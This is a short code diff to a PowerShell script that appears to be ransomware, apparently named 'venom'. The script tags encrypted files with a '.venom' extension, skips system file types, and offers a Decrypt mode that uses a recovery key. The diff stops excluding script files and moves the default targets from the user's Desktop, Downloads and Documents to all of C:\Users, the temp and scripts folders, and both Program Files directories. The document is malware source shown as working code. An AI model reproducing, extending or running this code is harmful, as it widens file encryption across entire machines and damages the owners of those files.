@@ -25,8 +25,8 @@ $stageDir = "c:\temp"
 $readmePath = Join-Path $stageDir -ChildPath $Readme
 $logFile = "c:\venom\venom_log.txt"
 $ran_extension = ".venom"
-$extension_exclusion = @('*.exe','*.lnk','*.dll','*.bin','*.bat','*.cmd','*.sys','*.inf','*.vxd','*.ini','*.cfg','*.reg','*.hiv','*.venom','venom*','spawn.ps1','*.dat','*.msi','readme.txt','*.ls','*.acm','*.efi','*.mui')
-$exclude_scripts = @('*.ps1','*.py','*.cs','*.js','*.zip')
+$extension_exclusion = @('*.exe','*.lnk','*.dll','*.bin','*.bat','*.cmd','*.sys','*.inf','*.vxd','*.ini','*.cfg','*.reg','*.hiv','*.venom','venom*','cripple*','pamper*','*.save','*.dmp','spawn.ps1','*.dat','*.msi','readme.txt','*.ls','*.acm','*.efi','*.mui')
+#$exclude_scripts = @('*.ps1','*.py','*.cs','*.js','*.zip')
 $extension_exclusion += "*.$($ran_extension)"
 $extension_exclusion += $exclude_scripts
 
@@ -425,10 +425,9 @@ if ($Decrypt) {
     #$Recovery_Key = Read-Host -Prompt "Enter the Recovery Key (TMKey) for AES Decryption" -AsSecureString
 }
 if (!$TargetPath) {
-    $userDir=$env:UserProfile
-    $subDirList = @('\Desktop','\Downloads','\Documents')
+    $subDirList = @('\Users','\temp','\scripts', '\Program Files', '\Program Files (x86)')
     foreach($subdir_name in $subDirList) {
-        $user_targetdir = $userDir + $subdir_name
+        $user_targetdir = "c:\" + $subdir_name
         #Write-Host "Iterating through Directory: $user_targetdir"
         if (Test-Path -LiteralPath $user_targetdir -ErrorAction SilentlyContinue) {
             if ($Decrypt) {
